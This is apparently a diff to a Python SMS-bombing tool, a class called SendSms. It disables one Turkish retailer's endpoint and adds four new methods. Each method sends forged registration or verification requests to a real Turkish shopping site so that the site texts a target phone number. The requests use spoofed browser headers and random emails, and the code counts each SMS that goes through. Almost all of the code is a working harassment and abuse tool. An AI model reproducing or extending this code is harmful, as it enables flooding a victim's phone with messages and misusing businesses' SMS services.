@@ -163,21 +163,21 @@ class SendSms():
         
 
     #watsons.com.tr--sms
-    def watsons(self):    
-        try:
-            watsons = requests.post("https://www.watsons.com.tr/Customer/VerifyPhoneNumber", data={
-                "phoneNumber": self.phone,
-                "email": f"{self.random_mail}@gmail.com",
-                "isLogin": "false",
-                "getCustomerPhone": "false"
-            }, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"})
-            if watsons.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
+    # def watsons(self):    
+    #     try:
+    #         watsons = requests.post("https://www.watsons.com.tr/Customer/VerifyPhoneNumber", data={
+    #             "phoneNumber": self.phone,
+    #             "email": f"{self.random_mail}@gmail.com",
+    #             "isLogin": "false",
+    #             "getCustomerPhone": "false"
+    #         }, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"})
+    #         if watsons.json()["Success"] == True:
+    #             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
+    #             self.adet += 1
+    #         else:
+    #             raise
+    #     except:
+    #         print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
         
 
     # babyturco.com--sms
@@ -555,3 +555,64 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> superpedestrian.com")
+
+    
+    #apaydinsupermarket.com
+    def Aydin(self):
+        try:
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.apaydinsupermarket.com", "Dnt": "1", "Referer": "https://www.apaydinsupermarket.com/urunler/309/kurdan", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
+            data = {"cepTel": self.phone}
+            aydin = requests.post("https://www.apaydinsupermarket.com/uye/uyeolMobile", headers=headers, data=data)
+            if aydin.json()["result"]["statusMessage"] == "success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apaydinsupermarket.com")
+                self.adet += 1
+            else:
+                raise    
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apaydinsupermarket.com")
+            
+            
+    #loncamarket.com
+    def Lonca(self):
+        try:
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
+            json={"Address": self.phone, "ConfirmationType": 0}
+            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False)
+            if lonca.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com")   
+            
+    
+    #bizimtoptan.com.tr
+    def Bizim(self):
+        try:
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.bizimtoptan.com.tr", "Dnt": "1", "Referer": "https://www.bizimtoptan.com.tr/register", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
+            data = {"Phone": self.phone, "Email": self.random_mail, "Password": "31ABC..abc31", "Resend": "true"}
+            bizim = requests.post("https://www.bizimtoptan.com.tr/Customer/SendCustomerSmsValidationMessage", headers=headers, data=data)
+            if bizim.json()["Success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bizimtoptan.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bizimtoptan.com.tr")   
+            
+    
+    #dgnonline.com
+    def Dgn(self):
+        try:
+            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
+            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
+            dgn = requests.post(url, headers=headers, data=data)
+            if dgn.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dgnonline.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dgnonline.com")   
